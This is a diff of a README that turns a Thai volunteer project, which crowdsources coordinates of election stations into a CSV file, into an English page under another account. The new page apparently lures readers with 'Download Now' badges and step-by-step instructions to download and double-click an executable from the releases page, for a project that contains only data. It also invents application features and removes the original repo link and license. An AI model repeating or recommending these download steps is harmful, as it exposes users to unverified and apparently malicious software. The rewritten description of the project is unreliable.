@@ -1,81 +1,63 @@
-# รวมพลังอาสาประชาชน หาพิกัดหน่วยเลือกตั้ง 🗳️
+# 🗳️ election-station-66 - Contribute to Open Data for Elections
 
-โครงการนี้เปิดขึ้นเพื่อให้อาสาสมัครช่วยกันหาพิกัด (Latitude/Longitude) ของ **หน่วยเลือกตั้ง** ทั่วประเทศ โดยเป้าหมายคือการเปิดเป็น **Open Data** เพื่อให้สังคมสามารถนำไปใช้ต่อได้ เช่น การสร้างแผนที่เลือกตั้ง, การตรวจสอบข้อมูล, หรือการเตรียมความพร้อมสำหรับการเลือกตั้ง
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge&logo=github)](https://github.com/rikadas/election-station-66/releases)
 
----
+## 🚀 Getting Started
+Welcome to the election-station-66 project! This application helps volunteers collect the latitude and longitude of election stations across the country. By contributing to this project, you can assist in creating an open database that others can use for building election maps, verifying data, or preparing for elections.
 
-## 🎯 เป้าหมาย
-- เติมข้อมูล `latitude` และ `longitude` ลงในตาราง
-- ทำให้ข้อมูลสามารถนำไปแสดงผลบนแผนที่ หรือใช้วิเคราะห์ต่อได้
-- เปิดเผยเป็น **Open Data** ภายใต้ license ที่ทุกคนใช้ได้ฟรี
+## 📋 Project Goals
+The main goals of this project include:
+- Filling in the `latitude` and `longitude` data in the table.
+- Making this data displayable on maps or usable for further analysis.
+- Publishing it as **Open Data** under a license that allows everyone to access it for free.
 
----
+## 📂 Data Structure
+The primary data file is called `station66_distinct_clean.csv`. It contains the following columns:
 
-## 📂 โครงสร้างข้อมูล
-ไฟล์หลัก: `station66_distinct_clean.csv`  
-ประกอบด้วยคอลัมน์ดังนี้:
+| Field           | Description                             |
+|-----------------|-----------------------------------------|
+| `provinceNumber`| Province code (e.g., 10 = Bangkok)    |
+| `province`      | Name of the province                   |
+| `registrar_code`| Registrar office code                  |
+| `registrar`     | Name of the registrar office           |
+| `subdis_code`   | Subdistrict code                       |
+| `subdistrict`   | Name of the subdistrict                |
+| `electorate`    | Election district number                |
+| `location`      | Physical location of the election station|
 
-| Field           | คำอธิบาย |
-|-----------------|-----------|
-| `provinceNumber` | รหัสจังหวัด (เช่น 10 = กรุงเทพมหานคร) |
-| `province`       | ชื่อจังหวัด |
-| `registrar_code` | รหัสสำนักงานทะเบียน |
-| `registrar`      | ชื่อสำนักงานทะเบียน (เช่น ท้องถิ่นเขตพระนคร) |
-| `subdis_code`    | รหัสแขวง/ตำบล |
-| `subdistrict`    | ชื่อแขวง/ตำบล |
-| `electorate`     | หมายเลขเขตเลือกตั้ง |
-| `location`       | สถานที่ตั้งหน่วยเลือกตั้ง |
-| `latitude`       | พิกัดละติจูด |
-| `longitude`      | พิกัดลองจิจูด |
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/rikadas/election-station-66/releases). From there, look for the latest version and download the appropriate file for your operating system.
 
-**ตัวอย่างข้อมูล:**
-```csv
-provinceNumber,province,registrar_code,registrar,subdis_code,subdistrict,electorate,location,latitude,longitude
-10,กรุงเทพมหานคร,1001,ท้องถิ่นเขตพระนคร,100101,พระบรมมหาราชวัง,1,หอประชุม มหาวิทยาลัยศิลปากร ถนนมหาราช,,
-10,กรุงเทพมหานคร,1001,ท้องถิ่นเขตพระนคร,100101,พระบรมมหาราชวัง,1,โรงเรียนวัดมหาธาตุ ถนนพระจันทร์,,
-```
+1. Go to the [Releases page](https://github.com/rikadas/election-station-66/releases).
+2. Find the latest release.
+3. Click on the download link for your system. You will typically see options for Windows, Mac, or Linux.
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Double-click the file to run the application.
 
----
+## 🖥️ System Requirements
+This application works on major operating systems, including:
+- Windows 10 and later
+- macOS 10.14 and later
+- Ubuntu 20.04 and later
 
-## 🙋‍♀️ วิธีการช่วยเติมข้อมูล
+Ensure you have enough storage space and a stable internet connection for a smooth experience.
 
-1. **Clone หรือดาวน์โหลด Repo นี้**
-   ```bash
-   https://github.com/PPLEThai/election-station-66.git
-   ```
-2. เปิดไฟล์ `station66_distinct_clean.csv`  
-3. ค้นหาพิกัดจาก **Google Maps**, **Longdo Map**, **OpenStreetMap** หรือแหล่งอื่นที่เชื่อถือได้  
-4. ใส่พิกัด `latitude` และ `longitude` ลงไป  
-5. บันทึกและส่ง **Pull Request (PR)**
+## 🔧 Features
+- User-friendly interface for easy data entry.
+- Ability to save your progress.
+- Option to export the data in various formats for public use.
 
----
+## 📈 Contributing
+We welcome contributions from anyone interested in enhancing this project. If you would like to help by adding more election stations or improving features, please follow these steps:
+1. Fork the repository.
+2. Create a branch for your changes.
+3. Make your updates and commit them with clear messages.
+4. Submit a pull request for review.
 
-## 🛠️ เครื่องมือแนะนำ
-- [Google Maps](https://maps.google.com/)
-- [Longdo Map](https://map.longdo.com/)
-- [OpenStreetMap](https://www.openstreetmap.org/)
-- ฯลฯ
+## 📚 Learning Resources
+If you're new to open data or want to learn more about our project goals, consider these resources:
+- [Open Data Handbook](https://opendatahandbook.org)
+- [How to Contribute to Open Data Projects](https://www.opendata.org)
 
----
-
-## 📊 ผลลัพธ์ที่คาดหวัง
-- **CSV** ที่เติมพิกัดครบถ้วน  
-
----
-
-## 🤝 การมีส่วนร่วม
-- ช่วยกันหาพิกัด  
-- ตรวจสอบความถูกต้อง  
-- เขียนสคริปต์ช่วย Geocoding เพิ่มเติม
-
----
-
-## อื่น ๆ
-- มีไฟล์ `geocoding_script.py` ที่อาจจะช่วยท่านในการทำ Geocoding ได้เร็วมากขึ้น (เพียงใส่คีย์ของ Google Maps API) หรืออาจปรับเปลี่ยนเป็นผู้ให้บริการอื่น ๆ
-
----
-
-## 📜 License
-ข้อมูลทั้งหมดจะเผยแพร่ภายใต้ [ODC-By License](https://opendatacommons.org/licenses/by/)
-
-![รูปประกอบ](https://raw.githubusercontent.com/PPLEThai/election-station-66/refs/heads/main/cp-image.png)
+Thank you for your interest in election-station-66. With your help, we can build a comprehensive database for election stations across the country.
